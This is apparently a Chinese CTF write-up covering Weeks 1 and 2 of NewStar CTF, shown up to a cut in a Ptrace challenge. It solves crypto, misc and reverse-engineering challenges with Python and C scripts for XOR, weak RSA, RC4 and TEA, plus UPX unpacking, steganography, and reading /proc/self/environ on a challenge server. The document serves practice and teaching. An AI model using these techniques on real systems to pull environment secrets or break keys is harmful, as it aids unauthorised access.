<h2 id="Crypto方向："><a href="#Crypto方向：" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="Xor："><a href="#Xor：" class="headerlink" title="Xor："></a>Xor：</h3><p>题目给了一个xor的python程序，将两个量执行后得到了c1的long整数和c2的byte字符串，并给出了<code>key = b&#39;New\_Star\_CTF&#39;</code>，现将<code>c2=b&#39;;:\x1c1&lt;\x03&gt;\*\x10\x11u;&#39;</code>转换为long整数<code>18329866411473355926313989435</code>，用题目所给库<code>pycryptodome</code>进行逆向还原，把key也从byte字符串转换为long整数，并分别用c1和c2与key进行异或运算，将得到的long整数再次转换为byte字符串，并用utf-8编码得到前半段<font color=deepskyblue><strong>flag{0ops!_yo</strong></font>和后半段<font color=deepskyblue><strong>u_know_XOR!}</strong></font>，最终<font color=deepskyblue><strong>flag{0ops!_you_know_XOR!}</strong></font>.<br>Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;New_Star_CTF&#x27;</span></span><br><span class="line">key2 = bytes_to_long(key)</span><br><span class="line">c1 = <span class="number">8091799978721254458294926060841</span></span><br><span class="line">c2 = <span class="string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span></span><br><span class="line">c2 = bytes_to_long(c2) <span class="comment"># 18329866411473355926313989435</span></span><br><span class="line">c1_xor = c1 ^ key2</span><br><span class="line">c1_bytes = long_to_bytes(c1_xor)</span><br><span class="line">c1_str = c1_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">c2_xor = c2 ^ key2</span><br><span class="line">c2_bytes = long_to_bytes(c2_xor)</span><br><span class="line">c2_str = c2_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">flag = c1_str + c2_str</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h3><p>将<code>4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D</code>扔进cyberchef，经过16进制+base32+base64转换为<font color=deepskyblue><strong>flag{B@sE_0f_CrYpt0_N0W}</strong></font>.</p>
<h3 id="一眼秒了："><a href="#一眼秒了：" class="headerlink" title="一眼秒了："></a>一眼秒了：</h3><p>观察所给py文件发现是RSA加密算法，给了两个308位的整数，测试getprime(512)函数发现生成的是154-155位的质数，这样得到的n可以是308位的整数，将第一个数(n)因数分解（分解网站<code>https://factordb.com/</code>）得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span><br><span class="line">q=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span><br></pre></td></tr></table></figure>
<p>计算φ(n) &#x3D; (p-1)*(q-1)： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phin=52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674858130758088899044472900099582762041084679725101595564288259840921657497158600332295551583526683560422708098048258479197276963841017255615653572783474986640</span><br></pre></td></tr></table></figure>
<p>私钥d 使用 gmpy2.invert(e,φ(n))求解得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=50815830946428726535614046353626937023197652348927437511761939372692971763376865348702551167390521792222849904014468110435221645117001665727526339627128906414128425003411450284449391237239907716037717446619737025290761260576445929041941546093509744402441915711334879221133938020030558707487954892232538055553</span><br></pre></td></tr></table></figure>
<p>结合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br></pre></td></tr></table></figure>
<p>而m &#x3D; pow(c, d, n)，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=56006392793407635344141327873443751833955250118605130634434259084012318581267186801727168881696715389</span><br></pre></td></tr></table></figure>
<p>把m从long转化为bytes得到b’<font color=deepskyblue><strong>flag{9cd4b35a-affc-422a-9862-58e1cc3ff8d2}</strong></font>‘，即包含flag.<br>Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span></span><br><span class="line">q = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span></span><br><span class="line">phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;φ =&#x27;</span>,phin)</span><br><span class="line">d = gmpy2.invert(e,phin)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">d = <span class="number">50815830946428726535614046353626937023197652348927437511761939372692971763376865348702551167390521792222849904014468110435221645117001665727526339627128906414128425003411450284449391237239907716037717446619737025290761260576445929041941546093509744402441915711334879221133938020030558707487954892232538055553</span></span><br><span class="line">c = <span class="number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m =&#x27;</span>,m)</span><br><span class="line">m = <span class="number">56006392793407635344141327873443751833955250118605130634434259084012318581267186801727168881696715389</span></span><br><span class="line">m2 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>,m2)</span><br><span class="line">m3 = m2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m3 =&#x27;</span>, m3)</span><br></pre></td></tr></table></figure>

<h3 id="Strange-King："><a href="#Strange-King：" class="headerlink" title="Strange King："></a>Strange King：</h3><p>观察发现<font color=red><strong>ksjr{EcxvpdErSvcDgdgEzxqjql}</strong></font>的前四位是偏移量分别为5,7,9,11的凯撒加密，以此类推得到初步结果<font color=red><strong>flag{RngcugFqPqvUvqrNgctkpi}</strong></font>，被包裹部分再进行偏移量为2的凯撒解密得到<font color=deepskyblue><strong>flag{PleaseDoNotStopLearing}</strong></font>.</p>
<h2 id="Misc方向："><a href="#Misc方向：" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="WhereIsFlag："><a href="#WhereIsFlag：" class="headerlink" title="WhereIsFlag："></a>WhereIsFlag：</h3><p>下载vmware和linux Ubuntu并安装虚拟机，在指令行里面nc指令进入所给地址，经过测试用ls指令在proc&#x2F;self里找到三个文件，其中environ用cat指令查看得到<font color=deepskyblue><strong>flag{a3aacfc0-a14c-4331-9cc1-0f70dc678d4b}</strong></font>.</p>
<h3 id="Labyrinth："><a href="#Labyrinth：" class="headerlink" title="Labyrinth："></a>Labyrinth：</h3><p>查看图片的LSB（<code>lsb.daidr.me</code>），在<code>RGB plane 0</code>模式下得到一张二维码，扫描得到<font color=deepskyblue><strong>flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}</strong></font>.</p>
<h3 id="decompress："><a href="#decompress：" class="headerlink" title="decompress："></a>decompress：</h3><p>将16个zip压缩分卷合并解压得到<font color=deepskyblue><strong>flag{e6468aaf-7ddc-4eb2-b6db-bce9f1ffb52f_oOo0hhh_U_r3411y_K0nw_h0w_2_d3c0mpr355_Multi-part_archive_5e35fcde-28e1-487d-9659-ba2dab629bb3_&amp;_Th1s_f1ag_15_s0O0oO_l0oOoOng999_b433dc9b-db28-4a1d-965b-dc0a95d3a53a}</strong></font>，整体32位小写MD5加密得到<font color=lime><strong>c6edaba55bac51875a215e2de11c35dd</strong></font>，即为flag.</p>
<h3 id="pleasingMusic："><a href="#pleasingMusic：" class="headerlink" title="pleasingMusic："></a>pleasingMusic：</h3><p>将音乐文件中出现的摩斯电码倒置解读得到<font color=red><strong>EZ_MORSE_CODE</strong></font>，即为flag.</p>
<h3 id="兑换码："><a href="#兑换码：" class="headerlink" title="兑换码："></a>兑换码：</h3><p>用winhex修改图片高度，在下方发现<font color=deepskyblue><strong>flag{La_vaguelette}</strong></font>.</p>
<h1 id="赛题轮次：Week2"><a href="#赛题轮次：Week2" class="headerlink" title="赛题轮次：Week2"></a>赛题轮次：Week2</h1><h2 id="已解出的题目：-1"><a href="#已解出的题目：-1" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Reverse</td>
<td align="center">UPX、drink_TEA、Ptrace、ezencrypt、PangBai 泰拉记（1）、Dirty flowers</td>
</tr>
<tr>
<td align="center">Web</td>
<td align="center">你能在一秒内打出八句英文吗</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">这是几次方？疑惑！、Since you konw something、<br>茶里茶气、Just one and more than two</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">wireshark_checkin、wireshark_secret、热心助人的小明同学、<br>用溯流仪见证伏特台风、你也玩原神吗、字里行间的秘密、Herta’s Study</td>
</tr>
</tbody></table>
<h2 id="Reverse方向：-1"><a href="#Reverse方向：-1" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="UPX："><a href="#UPX：" class="headerlink" title="UPX："></a>UPX：</h3><p>用exeinfope查看发现加了upx壳，用UPX程序对原文件进行脱壳，用IDA反编译得到main主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%22s&quot;</span>, s);</span><br><span class="line">  RC4(s, key);</span><br><span class="line">  <span class="keyword">for</span> ( status = <span class="number">0</span>; status &lt;= <span class="number">21</span>; ++status )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[status] != data[status] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;this is Wrong~&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(status);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;this is right~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现是RC4算法，通过IDA反编译找到key为<font color=red><strong>NewStar</strong></font>，在Linux Ubuntu上进行动态调试，打断点后得到data内储存的数据为：<font color=lime><strong>{0xC4, 0x60, 0xAF, 0xB9, 0xE3, 0xFF, 0x2E, 0x9B, 0xF5, 0x10, 0x56, 0x51, 0x6E, 0xEE, 0x5F, 0x7D, 0x7D, 0x6E, 0x2B, 0x9C, 0x75, 0xB5}</strong></font>，询问AI得到RC4解密代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// RC4算法的实现</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">int</span> data_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, t;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>], K[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    <span class="comment">// 初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">        K[i] = key[i % <span class="built_in">strlen</span>((<span class="type">char</span> *)key)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 打乱S盒</span></span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + S[i] + K[i]) % <span class="number">256</span>;</span><br><span class="line">        temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成密钥流并加密/解密数据</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (t = <span class="number">0</span>; t &lt; data_len; t++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">        temp = S[i];</span><br><span class="line">        S[i] = S[j];</span><br><span class="line">        S[j] = temp;</span><br><span class="line">        data[t] ^= S[(S[i] + S[j]) % <span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">32</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[] = &#123;<span class="number">0xC4</span>, <span class="number">0x60</span>, <span class="number">0xAF</span>, <span class="number">0xB9</span>, <span class="number">0xE3</span>, <span class="number">0xFF</span>, <span class="number">0x2E</span>, <span class="number">0x9B</span>, <span class="number">0xF5</span>, <span class="number">0x10</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x6E</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x7D</span>, <span class="number">0x7D</span>, <span class="number">0x6E</span>, <span class="number">0x2B</span>, <span class="number">0x9C</span>, <span class="number">0x75</span>, <span class="number">0xB5</span>&#125;;</span><br><span class="line">    <span class="comment">// 使用RC4算法对data进行解密</span></span><br><span class="line">    RC4(data, key, <span class="number">22</span>);</span><br><span class="line">    <span class="comment">// 输出解密后的flag</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The correct flag is: %s\n&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解出flag为：<font color=deepskyblue><strong>flag{Do_you_know_UPX?}</strong></font>.</p>
<h3 id="drink-TEA："><a href="#drink-TEA：" class="headerlink" title="drink_TEA："></a>drink_TEA：</h3><p>反编译观察主函数，发现首先是长度检测，要求输入的flag应当是32位（20h），然后将输入的字符每8字节执行一次以key &#x3D; ‘WelcomeToNewStar’的魔改TEA加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword\_7FF6E5E74078; i += <span class="number">8</span> )</span><br><span class="line">  sub\_7FF6E5E71180((<span class="type">unsigned</span> <span class="type">int</span> \*)&amp;Buf1[i], aWelcometonewst); <span class="comment">//aWelcomeNewSt即为key</span></span><br></pre></td></tr></table></figure>
<p>经过转换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">key = <span class="string">&quot;WelcomeToNewStar&quot;</span></span><br><span class="line">key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">key_ints = struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key_bytes)</span><br><span class="line"><span class="built_in">print</span>(key_ints)</span><br></pre></td></tr></table></figure>
<p>得到<font color=lime><strong>key &#x3D; [0x636C6557, 0x54656D6F, 0x77654E6F, 0x72617453]，动态调试找到加密后的32字节为：[0x78, 0x20, 0xF7, 0xB3, 0xC5, 0x42, 0x0C, 0xE, 0xDA, 0x85, 0x59, 0x21, 0x1A, 0x26, 0x56, 0x5A, 0x59, 0x29, 0x02, 0x0D, 0xED, 0x07, 0xA8, 0xB9, 0xEE, 0x36, 0x59, 0x11, 0x87, 0xFD, 0x5C, 0x23, 0x24]</strong></font>，那么按8字节进行合并得到<font color=lime><strong>[0x7820F7B3C542CEDA, 0x8559211A26565A59, 0x29020DED07A8B9EE, 0x36591187FD5C2324]</strong></font>，接下来观察被魔改的TEA加密部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF6E5E71180</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 -= <span class="number">1640531527</span>;</span><br><span class="line">    v3 += (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">    v4 += (a2[<span class="number">3</span>] + (v3 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v3);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  result = <span class="number">4</span>i64;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于TEA要把原数据拆分成两个部分，所以实际上每次大循环产生的v3和v4是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3		    v4</span><br><span class="line"><span class="number">0x7820F7B3</span>	<span class="number">0xC542CEDA</span></span><br><span class="line"><span class="number">0x8559211A</span>	<span class="number">0x26565A59</span></span><br><span class="line"><span class="number">0x29020DED</span>	<span class="number">0x07A8B9EE</span></span><br><span class="line"><span class="number">0x36591187</span>	<span class="number">0xFD5C2324</span></span><br></pre></td></tr></table></figure>
<p>并且这里的v5也与标准的TEA不同，是从<code>-1640531527</code>开始，每次逐步减小直到<code>-32*1640531527</code>的，基于此构建逆向函数后却发现不论是正向加密还是逆向解密，v3、v4的位数都会逐渐扩大，再次进行动态调试，代入测试值进行检查，发现key（a2）的值居然是变动的，并且v3、v4也一直维持八位数，再次详细观察推断后发现v3、v4、v5等均为32位整型，在计算过程中因为超出了32位上限而全部被 &amp; 0xFFFFFFFF，而a2的值的变动并不影响v3、v4在不变情况下的计算值（也就是说相当于没有变动），所以真正的加密函数是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  v5 = (v5 - <span class="number">1640531527</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  v3 = (v3 + ((a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4) ^ (a2[<span class="number">0</span>] + <span class="number">16</span> * v4))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  v4 = (v4 + ((a2[<span class="number">3</span>] + (v3 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v3))) &amp; <span class="number">0xFFFFFFFF</span></span><br></pre></td></tr></table></figure>
<p>基于此编写逆向代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a2 = [<span class="number">0x636C6557</span>, <span class="number">0x54656D6F</span>, <span class="number">0x77654E6F</span>, <span class="number">0x72617453</span>]</span><br><span class="line">v3 = [<span class="number">0x7820F7B3</span>, <span class="number">0x8559211A</span>, <span class="number">0x29020DED</span>, <span class="number">0x36591187</span>]</span><br><span class="line">v4 = [<span class="number">0xC542CEDA</span>, <span class="number">0x26565A59</span>, <span class="number">0x07A8B9EE</span>, <span class="number">0xFD5C2324</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  v5 = (-<span class="number">32</span> * <span class="number">1640531527</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v4[i] = (v4[i] - ((a2[<span class="number">3</span>] + (v3[i] &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3[i]) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v3[i]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v3[i] = (v3[i] - ((a2[<span class="number">1</span>] + (v4[i] &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4[i]) ^ (a2[<span class="number">0</span>] + <span class="number">16</span> * v4[i]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v5 = (v5 + <span class="number">1640531527</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;%#x&#x27;</span> % v3[i], <span class="string">&#x27;%#x&#x27;</span> % v4[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3		    v4</span><br><span class="line"><span class="number">0x375bac75</span>	<span class="number">0x6426e101</span></span><br><span class="line"><span class="number">0x28af0d64</span>	<span class="number">0x59ed8260</span></span><br><span class="line"><span class="number">0x04aa71d2</span>	<span class="number">0x5e2afbfb</span></span><br><span class="line"><span class="number">0xcc99e4b9</span>	<span class="number">0x1f63f6e9</span></span><br></pre></td></tr></table></figure>
<p>但是并无法转换成可读字符，再观察寄存器RCX后发现四个字节是倒着填进去的（也就是说假设对计算结果37 5B AC 75，实际填入的是75 AC 5B 37，这叫做小端序），所以与原式不同，我们将原式每四个字节按小端序填入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">0xB3F72078</span>, <span class="number">0x1A215985</span>, <span class="number">0xED0D0229</span>, <span class="number">0x87115936</span>]</span><br><span class="line">v4 = [<span class="number">0xDACE42C5</span>, <span class="number">0x595A5626</span>, <span class="number">0xEEB9A807</span>, <span class="number">0x24235CFD</span>]</span><br></pre></td></tr></table></figure>
<p>再次带入逆向脚本，得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3		    v4</span><br><span class="line"><span class="number">0x67616c66</span>	<span class="number">0x6568547b</span></span><br><span class="line"><span class="number">0x525f6572</span>	<span class="number">0x4145545f</span></span><br><span class="line"><span class="number">0x4554585f</span>	<span class="number">0x6e615f41</span></span><br><span class="line"><span class="number">0x58585f64</span>	<span class="number">0x7d414554</span></span><br></pre></td></tr></table></figure>
<p>十六进制转字符串得到：<font color=deepskyblue><strong>galfehT{R_erAET_ETX_na_AXX_d}AET</strong></font>，转换端序得到：<font color=deepskyblue><strong>flag{There_R_TEA_XTEA_and_XXTEA}</strong></font>.</p>
<h3 id="Ptrace："><a href="#Ptrace：" class="headerlink" title="Ptrace："></a>Ptrace：</h3><p>发现有两个文件father和son，反编译观察得知父程序检测输入的32个字符并创建子进程（也就是子程序），在子进程中完成检验，父程序会在<font color=red><strong>ptrace(PTRACE_POKEDATA, addr, addr, 3)</strong></font>中将子程序的<font color=red><strong>dword_60004040</strong></font>从其初始化设置的4改为3，子程序以<code>start</code>函数为起始，以<font color=red><strong>sub_600011AD</strong></font>作为main函数，函数中的</p>
